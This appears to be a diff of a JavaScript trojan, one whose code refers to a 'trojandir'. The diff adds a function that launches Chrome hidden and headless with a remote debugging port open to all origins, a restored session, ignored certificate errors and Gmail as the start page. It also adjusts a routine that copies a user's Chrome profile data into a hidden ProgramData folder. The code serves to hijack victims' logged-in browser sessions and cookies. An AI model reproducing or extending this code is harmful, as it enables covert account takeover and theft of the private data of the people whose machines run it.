@@ -2617,7 +2617,6 @@ function runpsrelay(pubnubo) {
 function runnoderelay(pubnubo) {
     logmsg("starting");
 
-    // anchor
     const child = spawn(systemstate.nodeexepath, ["-i"], {
         shell: false,
         detached: true,
@@ -2632,7 +2631,6 @@ function runnoderelay(pubnubo) {
     // [CADZ248S]: child.stdin.on --> wired up within relay() func
     // lookup [7SZOSMSP]
 
-    // anchor --> 
     child.stdout.on("data", (data) => {
         const str = Buffer.from(data).toString();
 
@@ -4355,6 +4353,62 @@ function getFilesByExtensionSync(dirPath, extension) {
     return results;
 }
 
+// anchor
+function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir=null) {
+
+    datadir = datadir || path.join(systemstate.trojandir, 'chrome');
+
+    let cmdlineargs = [ 
+        `--remote-debugging-port=${debugport}`,
+        `--user-data-dir=${datadir}`,
+        `--new-window ${starturl}`,
+        `--headless=new`,
+        `--no-first-run`,
+        `--no-default-browser-check`,
+        `--profile-directory=Default`,
+        `--remote-allow-origins=*`,
+        `--restore-last-session`,
+        `--ignore-certificate-errors`,
+        `--window-position=2000,2000`,
+        `--window-size=10,10`
+    ];
+
+    // TODO auto discover by reading chrome lnk files
+    let chrome_exe_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+
+    const child = spawn(
+        chrome_exe_path,
+        [ ...cmdlineargs ],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            // stdio: ["ignore", out, err],
+            // shell: false,
+            // cwd: systemstate.trojandir,
+        }
+    );
+
+    child.stdout.on("data", (data) => {
+        let text = data.toString();
+
+        if (stdoutfunc) stdoutfunc(text);
+        else logmsg(text);
+    });
+
+    child.stderr.on("data", (data) => {
+        let text = data.toString();
+
+        if (stderrfunc) stderrfunc(text);
+        else logmsg(text);
+    });
+
+    child.on("close", (code) => {
+        if (closefunc) closefunc(code);
+        else logmsg(`Child process exited with code ${code}`);
+    });
+
+    return child;
+}
 
 // TODO modify for client PCs / TPL
 async function modify_chrome() {
@@ -4423,7 +4477,8 @@ async function modify_chrome() {
     srcpath = 'C:\\Users\\ADULT2022\\AppData\\Local\\Google\\Chrome\\User Data';
     destpath = 'C:\\ProgramData\\owd\\chrome';
 
-    ret = await copy_userdata(srcpath, destpath); // anchor
+    if ( ! folderExists(destpath) )
+        ret = await copy_userdata(srcpath, destpath);
 
     process.exit(0);
 }
